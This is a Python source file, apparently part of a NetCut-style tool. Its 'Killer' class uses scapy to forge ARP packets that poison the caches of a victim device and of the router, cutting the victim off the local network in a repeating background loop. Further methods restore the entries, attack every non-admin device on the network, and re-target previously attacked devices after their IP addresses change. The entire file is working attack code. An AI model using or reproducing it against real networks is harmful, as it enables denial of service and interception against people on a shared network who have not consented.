from scapy.all import ARP, send
from utils import threaded, get_default_iface
from time import sleep

from constants import *

class Killer:
    def __init__(self, router=DUMMY_ROUTER):
        self.iface = get_default_iface()
        self.router = router
        self.killed = {}
        self.storage = {}

    @threaded
    def kill(self, victim, wait_after=1):
        """
        Spoofing victim
        """
        if victim['mac'] in self.killed:
            print(victim['mac'], 'is already killed.')
            return
        
        self.killed[victim['mac']] = victim

        # Cheat Victim
        to_victim = ARP(
            op=1,
            psrc=self.router['ip'],
            hwdst=victim['mac'],
            pdst=victim['ip']
        )

        # Cheat Router
        to_router = ARP(
            op=1,
            psrc=victim['ip'],
            hwdst=self.router['mac'],
            pdst=self.router['ip']
        )

        print('killed', victim['mac'])

        while victim['mac'] in self.killed \
            and self.iface.name != 'NULL':
            # Send packets to both victim and router
            send(to_victim, iface=self.iface.name ,verbose=0)
            send(to_router, iface=self.iface.name ,verbose=0)
            sleep(wait_after)

        print('unkilled', victim['mac'])

    @threaded
    def unkill(self, victim):
        """
        Unspoofing victim
        """
        self.killed.pop(victim['mac'])

        # Fix Victim
        to_victim = ARP(
            op=1,
            psrc=self.router['ip'],
            hwsrc=self.router['mac'],
            pdst=victim['ip'],
            hwdst=victim['mac']
        )

        # Fix Router
        to_router = ARP(
            op=1,
            psrc=victim['ip'],
            hwsrc=victim['mac'],
            pdst=self.router['ip'],
            hwdst=self.router['mac']
        )

        if self.iface.name != 'NULL':
            # Send packets to both victim and router
            send(to_victim, iface=self.iface.name ,verbose=0)
            send(to_router, iface=self.iface.name ,verbose=0)

    def kill_all(self, device_list):
        """
        Safely kill all devices
        """
        for device in device_list[:]:
            if device['admin']:
                continue
            if device['mac'] not in self.killed:
                self.kill(device)

    def unkill_all(self):
        """
        Safely unkill all devices killed previously
        """
        for mac in dict(self.killed):
            self.killed.pop(mac)
    
    def store(self):
        """
        Save a copy of previously killed devices
        """
        self.storage = dict(self.killed)
    
    def release(self):
        """
        Remove the stored copy of killed devices
        """
        self.storage = {}
    
    def rekill_stored(self, new_devices):
        """
        Re-kill old devices in self.storage
        """
        for mac, old in self.storage.items():
            for new in new_devices:
                # Update old killed with newer ip
                if old['mac'] == new['mac']:
                    old['ip'] = new['ip']
                    break
                
            # Update new_devices with those it does not have
            if old not in new_devices:
                new_devices.append(old)

            self.kill(old)
